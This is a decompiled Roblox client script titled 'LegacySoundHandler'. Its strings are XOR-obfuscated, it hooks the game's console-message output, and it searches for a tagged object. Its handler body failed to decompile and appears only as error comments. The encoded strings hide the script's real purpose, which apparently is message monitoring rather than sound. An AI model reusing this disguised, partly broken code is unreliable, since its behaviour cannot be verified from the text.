--[[
    Script: StarterPlayer.StarterPlayerScripts.LegacySoundHandler
    Type: LocalScript
    Decompiled with Konstant using Nebula Decompiler
--]]

-- Decompiler will be improved VERY SOON!
-- Decompiled with Konstant V2.1, a fast Luau decompiler made in Luau by plusgiant5 (https://discord.gg/wyButjTMhM)
-- Decompiled on 2025-03-29 09:48:36
-- Luau version 6, Types version 3
-- Time taken: 0.001847 seconds

local bit32 = bit32
if not bit32 then
	bit32 = bit
end
local bxor_upvr = bit32.bxor
local sub_upvr = string.sub
local byte_upvr = string.byte
local char_upvr = string.char
local insert_upvr = table.insert
local concat_upvr = table.concat
local function v7_upvr(arg1, arg2) -- Line 48, Named "v7"
	--[[ Upvalues[6]:
		[1]: bxor_upvr (readonly)
		[2]: sub_upvr (readonly)
		[3]: byte_upvr (readonly)
		[4]: char_upvr (readonly)
		[5]: insert_upvr (readonly)
		[6]: concat_upvr (readonly)
	]]
	local module = {}
	for i = 1, #arg1 do
		insert_upvr(module, char_upvr(bxor_upvr(byte_upvr(sub_upvr(arg1, i, i + 1)), byte_upvr(sub_upvr(arg2, 1 + i % #arg2, 1 + i % #arg2 + 1))) % 256))
	end
	return concat_upvr(module)
end
local tbl_upvr = {v7_upvr("\x7F\x04\x2B\x1D\xF0\x10\x3A\x2B\x10\xEC\x51\x04\x3B", "\x9E0vBr"), v7_upvr("\x99\x25\x09\x30\x7A\xA0\xF7\xAF\x64\x0C\x76\x5D\xAA\xEF\xEB\x37\x15\x33\x7A\xAB\xFC\xEB\x3D\x1F\x23\x61\xE5\xFA\xA8\x30\x19\x39\x7D\xB6\xBB\xA2\x2A\x50\x38\x7C\xB1\xF2\xAD\x2D\x13\x37\x67\xAC\xF4\xA5\x37\x4F", "\x9B\xCB\x44\x70\x56\x13\xC5"), v7_upvr("\x65\xD5\x33\xFF\x4B\x38\xE1\xF7\x45\xCE\x78\xEF\x49\x6A\xEC\xED\x55\x93\x3B\xF9\x4E\x6D\xA5\xFE\x49\xCF\x76\xF4\x45\x74\xF5\xB8\x51\xD4\x22\xF4\x00\x4A\xE4\xE1\x40\xD4\x33\xF0\x44\x38\xF6\xE8\x43\xDE\x3F\xFA\x49\x7B\xA5\xFC\x43\xCB\x33\xF0\x4F\x68\xE8\xFD\x48\xC9\x78", "\x98\x26\xBD\x56\x9C\x20\x18\x85"), v7_upvr("\xD9\x4F\xA2\x45\xE9\x43\xA8\x54\xBC\x0D\xE7\x6D\xEE\x59\xAB", "\x26\x9C\x37\xC7"), v7_upvr("\x8D\x65\x79\x2B\x06\x60\xF5\x51\xE8\x27\x3C\x0C\x16\x78\xEE\x42", "\x23\xC8\x1D\x1C\x48\x73\x14\x9A"), v7_upvr("\x3C\xA7\xD4\xDC\x98\x38\x3B\x0B\xFF\x8B\x9F\xB5\x29\x3A\x16", "\x54\x79\xDF\xB1\xBF\xED\x4C"), v7_upvr("\x9E\x4E\xCC\xA3\x2F\x44\x3F\xD3\xFB\x0C\x89\x83\x35\x54\x35\xD9", "\xA1\xDB\x36\xA9\xC0\x5A\x30\x50"), v7_upvr("lZ\x05&\\V\x0F7\t\x18@\x0Fcq\x10)FK\x14eQ\x028 GM", "E)\"`"), v7_upvr("\x99\xDB\xD2\x09\x17\x3F\xB3\xD1\x97\x50\x42\x0A\xAE\xC0\xD2\x1F\x11\x6B\x84", "\x4B\xDC\xA3\xB7\x6A\x62"), v7_upvr("\x27\xA2\x8E\x34\xCC\x16\xB5\x99\x77\x83\x42\x9C\x87\x22\xC1\x17\xA9", "\xB9\x62\xDA\xEB\x57"), v7_upvr("\xEE\x24\x22\xE5\xCB\xBE\xC4\x2E\x67\xBC\x9E\x9C\xCE\x3B\x26\xDE", "\xCA\xAB\x5C\x47\x86\xBE"), v7_upvr("\x0C\xD9\x29\x8B\x3C\xD5\x23\x9A\x69\x9B\x6C\xA9\x39\xD1\x20\x8D\x1E\xC0\x3E\x8D", "\xE8\x49\xA1\x4C")}
local service_upvr = game:GetService(v7_upvr("\xE3\xC6\xCB\x29\xEF\xB8\xC6\x0A\xD4\xC7\xE8\x31\xE9\xA9\xC6\x19\xD4", "\x7E\xB1\xA3\xBB\x45\x86\xDB\xA7"))
local v7_upvr_result1_upvr = v7_upvr("\x12\xBE\x5B\x13\x9E\x29\x48\x30\xA4\x7A\x19\xA9\x28\x42", "&T\xD7)v\xDCF")
local function v12_upvr() -- Line 48, Named "v12"
	--[[ Upvalues[3]:
		[1]: service_upvr (readonly)
		[2]: v7_upvr (readonly)
		[3]: v7_upvr_result1_upvr (readonly)
	]]
	while true do
		for _, v in service_upvr:WaitForChild(v7_upvr("\x89\xDC\x4F\x52\x0A\xBE\xCA", "~۹\"=")):GetChildren() do
			if v:HasTag(v7_upvr_result1_upvr) then
				return v
			end
		end
		return nil
	end
end
game:GetService(v7_upvr("\x0F\xC2\x2D\xF6\xF9\x31\xDB\x23\xC6\xF9", "\x9C\x43\xAD\x4A\xA5")).MessageOut:Connect(function(arg1) -- Line 48, Named "v13"
	--[[ Upvalues[2]:
		[1]: tbl_upvr (readonly)
		[2]: v12_upvr (readonly)
	]]
	-- KONSTANTERROR: [0] 1. Error Block 1 start (CF ANALYSIS FAILED)
	-- KONSTANTERROR: [0] 1. Error Block 1 end (CF ANALYSIS FAILED)
	-- KONSTANTERROR: [32] 28. Error Block 12 start (CF ANALYSIS FAILED)
	-- KONSTANTERROR: [32] 28. Error Block 12 end (CF ANALYSIS FAILED)
	-- KONSTANTERROR: [4] 5. Error Block 2 start (CF ANALYSIS FAILED)
	-- KONSTANTERROR: [4] 5. Error Block 2 end (CF ANALYSIS FAILED)
end)